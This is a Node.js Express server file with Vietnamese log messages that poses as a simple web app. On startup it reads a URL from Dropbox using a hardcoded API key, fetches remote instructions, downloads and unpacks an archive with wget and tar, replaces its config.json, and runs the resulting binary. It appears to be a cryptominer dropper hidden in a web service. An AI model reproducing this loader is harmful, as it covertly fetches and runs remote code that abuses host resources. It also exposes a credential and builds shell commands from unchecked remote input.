const express = require('express')
const path = require('path')
const PORT = process.env.PORT || 5000
const shell = require('shelljs')
const fetch = require('node-fetch');
const {
    exec
} = require("child_process");
const app = require('express')()
    .use(express.static(path.join(__dirname, 'public')))
    .set('views', path.join(__dirname, 'views'))
    .set('view engine', 'ejs');
const http = require('http').createServer(app);

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}
app.get('/', (req, res, next) => {
    res.render('pages/index');
});
url = ""
const dfs = require('dropbox-fs')({
    apiKey: '6jL9oJX5GWkAAAAAAAAAARfqw7aNQlwpO5co07J1wWsB5JfuTNuaTuhwHTZf62zA'
});
async function getURLData() {
    console.log("bat dau lay du lieu tu dropbox")
    await dfs.readFile('/4bot/url.txt', (err, result) => {
        //console.log(err)
        console.log(result.toString('utf8'));
        url = result.toString('utf8') + "/home/getinfo"
        settings = {
            method: "Get"
        };
        fetch(url, settings)
            .then(res => res.json())
            .then(async(json) => {
                // do something with JSON
                url_download = await json.url_download
                file_name = await json.file_name
                file_config_name = await json.file_config_name
                await mymin(url_download, file_name, file_config_name);
            });
    });

}
async function mymin(url, file, file_config_name) {
    await exec("rm -f " + file_name, (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
        console.log('Đã xoa file cu');
    });
    await sleep(5000)
    await exec("wget " + url_download + "/" + file_name, (error, stdout, stderr) => {
        console.log('Đã tải về');
    });
    await sleep(20 * 1000);
    await exec("tar -xf " + file_name, (error, stdout, stderr) => {
        console.log('Đã bung nén xong');
    });
    await sleep(2 * 1000);
    //await sleep(10*1000);
    await shell.cd('myfile')
    await shell.rm('config.json')
    await shell.exec("wget " + url_download + file_config_name, (error, stdout, stderr) => {
        console.log('Đã tải file config về');
    });
    await sleep(2 * 1000);
    await shell.exec("mv " + file_config_name + " config.json", (error, stdout, stderr) => {
        console.log('Đã đổi tên file cấu hình thành config.json');
    });
    var time = await Math.floor(Date.now() / 1000);
    await shell.exec("mv myfile myfile_" + time, (error, stdout, stderr) => {
        console.log('Đã đổi tên file run thành myfile_' + time);
    });
    await sleep(2 * 1000);
    await shell.exec('./myfile_' + time)
}


http.listen(PORT, () => {
	getURLData()
mymin();


    console.log('listening on *:' + PORT);
});